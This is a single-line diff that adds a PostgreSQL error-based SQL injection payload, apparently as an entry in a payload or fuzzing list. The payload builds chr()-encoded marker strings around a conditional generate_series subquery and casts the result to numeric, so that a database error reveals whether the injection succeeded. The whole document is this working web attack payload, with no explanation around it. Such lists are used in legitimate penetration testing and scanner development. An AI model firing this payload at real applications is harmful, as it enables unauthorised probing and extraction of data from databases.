@@ -1,0 +1,1 @@
+(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))
